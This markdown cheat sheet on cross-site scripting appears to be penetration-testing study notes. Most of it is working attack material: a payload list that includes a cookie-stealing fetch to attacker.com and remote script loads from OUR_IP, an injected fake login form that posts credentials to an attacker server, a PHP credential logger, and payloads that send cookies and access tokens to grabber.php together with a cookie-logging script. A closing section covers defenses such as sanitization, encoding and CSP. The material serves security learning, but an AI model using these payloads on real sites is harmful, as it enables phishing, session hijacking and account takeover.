### Content

- [Overview](#overview)
- [Payloads](#payloads)
- [Stored XSS](#stored-xss)
- [Reflected XSS](#reflected-xss)
- [DOM Based XSS](#dom-based-xss)
	- [Source & Sink](#source-&-sink)
- [Defacing](#defacing)
- [Phishing](#phishing)
- [Blind XSS Detection](#blind-xss-detection)
	- [Session Hijacking](#session-hijacking)
- [Prevention](#prevention)
	- [Front-end](#front-end)
		- [Input Validation](#input-validation)
		- [Input Sanitization](#input-sanitization)
	- [Back-end](#back-end)
		- [Input Validation](#input-validation)
		- [Input Sanitization](#input-sanitization)
	- [Output HTML Encoding](#output-html-encoding)
	- [Server Configuration](#server-configuration)

> Automated discovery: [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), [XSSer](https://github.com/epsylon/xsser)

---
### Overview

- Cause: Lack of user input sanitization leads to write JS code to the page and execute it on the client side.
- Impact:
	- Target user unwittingly send their session cookie to the attacker's web server.
	- Target's browser execute API calls that lead to a malicious action.
	- Defacing attacks can carry great media echo and may significantly affect a company's investments and share prices.
- Types:
	- Stored (Persistent), (The most critical)
	- Reflected (Non-Persistent)
	- DOM-based (Non-Persistent)
---
### Payloads

> [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), [PayloadBox](https://github.com/payloadbox/xss-payload-list)

```HTML
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
<img src="" onerror=alert(window.origin)>

'> <script>document.write('<form action=http://10.10.16.4/index.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script> <!--- deleter the - - > -->

<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>

```

---
#### Stored XSS

(Persistent) `Attacker store the payload on the web page for any visitor`.
The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)

---
#### Reflected XSS

(Non-Persistent) `Attacker can send a URL containing our payload`.
Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)

---
#### DOM Based XSS

(Non-Persistent) `Attacker can send a URL containing our payload`.
Occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags), it occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.

##### Source & Sink

The `Source` is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

The `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack.

Commonly used JavaScript functions to write to DOM objects are:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Some of the `jQuery` library functions that write to DOM objects are:

- `add()`
- `after()`
- `append()`

We can see that in tasks app website, `Source` is being taken from the `task=` parameter:

```js
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

The the page uses the `innerHTML` function to write the `task` variable in the `todo` DOM:

```js
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

we can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.

---
### Defacing 

One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. `Defacing` a website means changing its look for anyone who visits the website.

Such attacks can carry great media echo and may significantly affect a company's investments and share prices, especially for banks and technology firms.

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

Example: 

```html
<!-- change background color -->
<script>document.body.style.background = "#141d2b"</script>
<!-- set background image -->
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<!-- change page title -->
<script>document.title = 'HackTheBox Academy'</script>
<!-- Change specific element text -->
<script>document.getElementById("todo").innerHTML = "New Text"</script>
```

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):

```js
$("#todo").html('New Text');
```

Selecting the first `body` element with `document.getElementsByTagName('body')`.

```js
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

---
### Phishing

A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

Login form for injection

```HTML
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

If we can execute JS inside `<script></script>` tags, we can inject this form using `document.write()` function:

```JS
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Clean the rest of the page by commenting the remaining HTML using `<!--` and also by removing any other elements that would look suspicious, for example the main form in the page, we can do that by using the JS `document.getElementById().remove()` function.

```HTML
<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

The attacker can start a listener on his server which will receive the target credentials as soon as they click submit:

```bash
$ sudo nc -lvnp 80
```

Using `netcat` will raise some suspicions as the victim would get an `Unable to connect` error.
The attacker can use his PHP server using simple PHP script:

```PHP
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Attacker start his server:

```bash
$ mkdir /tmp/tmpserver
$ cd /tmp/tmpserver
$ vi index.php
$ sudo php -S 0.0.0.0:80
```

When a victim login using the attacker malformed form, his credentials will be written in the file `creds.txt` which was specified on the PHP script.

---
### Blind XSS Detection

A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

To trigger a blind XSS, attacker must use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

After starting the server in the attacker machine, whether it was PHP or Python server:

```bash
$ sudo php -S 0.0.0.0:80
# Or a python server
$ python -m http.server 80
```

we can insert our server address inside the `src` attribute of the `<script>` tag

```html
<script src="http://OUR_IP/script.js"></script>
```

If we have many fields to test in the form, we can edit the file name to be requested to be unique for every field

```html
"> <script src="http://OUR_IP/username"></script>
'> <script src="http://OUR_IP/firstName"></script>
<script src="http://OUR_IP/lastName"></script>
```

#### Session Hijacking

Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.

If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials. With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

We can send the payload to the target and start our PHP server with this PHP script:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

---
### Prevention

#### Front-end

##### Input Validation

Ex, not allowing a user to submit the form if the email format is invalid. This can be done with the following JavaScript code which utilizing regex to validate an email:

```js
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

##### Input Sanitization

We can sanitize user input by escaping any special characters. For this, we can utilize the [DOMPurify](https://github.com/cure53/DOMPurify) JavaScript library, which will escape any special character with a `\`.

```js
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

##### Direct Input

Ensure that we never use user input directly within certain HTML tags, like:

1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability.

Avoid using JavaScript functions that allow changing raw text of HTML fields, like:

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

And the following jQuery functions:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.

#### Back-end

It's a must to have XSS prevention measures on the back-end. This can be achieved with Input and Output Sanitization and Validation, Server Configuration, and Back-end Tools that help prevent XSS vulnerabilities.

##### Input Validation

Using Regex or library functions to ensure that the input field is what is expected.

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

For a NodeJS back-end:

```js
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

##### Input Sanitization

Using the `addslashes` function to sanitize user input by escaping special characters with a backslash:

```php
addslashes($_GET['email'])
```

For a NodeJS back-end, we can also use the [DOMPurify](https://github.com/cure53/DOMPurify) library as with the front-end:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

In any case, direct user input (e.g. `$_GET['email']`) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.
Many sanitization functions can be utilized before displaying the value, like `htmlspecialchars($_GET['email'])`.

#### Output HTML Encoding

We have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability.

For a PHP back-end, Use the `htmlspecialchars` or the `htmlentities` functions, which would encode certain special characters into their HTML codes (e.g. `<` into `&lt;`), so the browser will display them correctly, but they will not cause any injection of any sort

```php
htmlentities($_GET['email']);
```

For a NodeJS back-end, we can use any library that does HTML encoding, like `html-entities`, as follows:

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

#### Server Configuration

There are web server configurations that may help in preventing XSS attacks, such as:

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

Also a good `Web Application Firewall (WAF)` can reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like [ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0).

---